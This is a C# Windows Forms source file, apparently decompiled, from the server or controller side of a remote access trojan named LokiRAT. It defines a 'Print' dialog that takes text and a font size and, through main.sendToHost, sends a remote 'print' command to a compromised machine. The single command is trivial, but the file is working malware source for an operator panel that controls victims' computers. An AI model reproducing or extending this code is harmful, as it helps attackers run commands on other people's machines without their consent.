namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class print : Form
    {
        private Button button1;
        private ComboBox comboBox1;
        private IContainer components = null;
        private Label label1;
        private RichTextBox richTextBox1;

        public print()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=print|" + this.comboBox1.Text + "|" + this.richTextBox1.Text);
            base.Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.richTextBox1 = new RichTextBox();
            this.button1 = new Button();
            this.label1 = new Label();
            this.comboBox1 = new ComboBox();
            base.SuspendLayout();
            this.richTextBox1.Location = new Point(-2, 0);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new Size(0x1b6, 0x14e);
            this.richTextBox1.TabIndex = 0;
            this.richTextBox1.Text = "";
            this.button1.Location = new Point(0x148, 340);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x61, 0x17);
            this.button1.TabIndex = 1;
            this.button1.Text = "Print";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 0x157);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x36, 13);
            this.label1.TabIndex = 2;
            this.label1.Text = "Font Size:";
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[] { "10", "11", "12", "16", "18", "24", "36", "72" });
            this.comboBox1.Location = new Point(0x48, 340);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new Size(0x2c, 0x15);
            this.comboBox1.TabIndex = 3;
            this.comboBox1.Text = "16";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x1b5, 0x171);
            base.Controls.Add(this.comboBox1);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.richTextBox1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "print";
            this.Text = "Print | LokiRAT";
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}

